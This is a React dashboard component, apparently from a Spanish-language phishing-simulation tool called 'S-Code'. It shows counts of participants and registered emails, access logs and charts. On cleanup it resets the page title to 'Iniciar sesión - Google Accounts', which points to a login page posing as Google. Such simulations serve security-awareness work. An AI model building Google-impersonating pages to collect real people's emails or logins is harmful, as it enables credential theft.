import { useState, useEffect } from 'react';
import api from '../api/axios';
import MetricCard from '../components/MetricCard';
import AccessTable from '../components/AccessTable';
import ParticipationsByDayChart from '../components/ParticipationsByDayChart';
import DomainsChart from '../components/DomainsChart';
import ParticipationsByHourChart from '../components/ParticipationsByHourChart';
import {
  DashboardWrapper,
  Header,
  HeaderLeft,
  HeaderLogo,
  HeaderTitle,
  HeaderBadge,
  MainContent,
  SectionTitle,
  MetricsGrid,
  ChartsGrid,
  LoadingContainer,
  Spinner,
} from '../styles/DashboardStyles';

function DashboardPage() {
  const [stats, setStats] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchData = async () => {
    try {
      const [statsRes, logsRes] = await Promise.all([
        api.get('/dashboard/stats'),
        api.get('/dashboard/logs'),
      ]);
      setStats(statsRes.data);
      setLogs(logsRes.data);
    } catch (err) {
      console.error('Error cargando datos del dashboard:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const link = document.querySelector('link[rel="icon"]');
    const originalHref = link?.getAttribute('href');
    const originalType = link?.getAttribute('type');
    if (link) {
      link.setAttribute('href', '/logo.png');
      link.setAttribute('type', 'image/png');
    }
    document.title = 'Dashboard - S-Code';

    fetchData();
    const interval = setInterval(fetchData, 15000);

    return () => {
      clearInterval(interval);
      if (link && originalHref) {
        link.setAttribute('href', originalHref);
        if (originalType) link.setAttribute('type', originalType);
        else link.removeAttribute('type');
      }
      document.title = 'Iniciar sesión - Google Accounts';
    };
  }, []);

  if (loading) {
    return (
      <LoadingContainer>
        <Spinner />
        <span>Cargando dashboard...</span>
      </LoadingContainer>
    );
  }

  const formatLastAccess = (dateStr) => {
    if (!dateStr) return 'Sin registros';
    const date = new Date(dateStr);
    return date.toLocaleString('es-AR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  return (
    <DashboardWrapper>
      <Header>
        <HeaderLeft>
          <HeaderLogo>S</HeaderLogo>
          <HeaderTitle>S-Code Dashboard</HeaderTitle>
        </HeaderLeft>
        <HeaderBadge>🔴 Simulación Activa</HeaderBadge>
      </Header>

      <MainContent>
        <SectionTitle>Métricas Generales</SectionTitle>
        <MetricsGrid>
          <MetricCard
            icon="👥"
            label="Participantes Totales"
            value={stats?.totalParticipants ?? 0}
            accentColor="#e94560"
            iconBg="rgba(233, 69, 96, 0.12)"
          />
          <MetricCard
            icon="📧"
            label="Correos Registrados"
            value={stats?.totalEmails ?? 0}
            accentColor="#533483"
            iconBg="rgba(83, 52, 131, 0.12)"
          />
          <MetricCard
            icon="📅"
            label="Participaciones del Día"
            value={stats?.todayParticipants ?? 0}
            accentColor="#0f3460"
            iconBg="rgba(15, 52, 96, 0.2)"
          />
          <MetricCard
            icon="🕐"
            label="Última Participación"
            value={formatLastAccess(stats?.lastAccess)}
            accentColor="#4285f4"
            iconBg="rgba(66, 133, 244, 0.12)"
          />
        </MetricsGrid>

        <SectionTitle>Registro de Accesos</SectionTitle>
        <AccessTable logs={logs} />

        <SectionTitle>Análisis Visual</SectionTitle>
        <ChartsGrid>
          <ParticipationsByDayChart logs={logs} />
          <DomainsChart logs={logs} />
          <ParticipationsByHourChart logs={logs} />
        </ChartsGrid>
      </MainContent>
    </DashboardWrapper>
  );
}

export default DashboardPage;
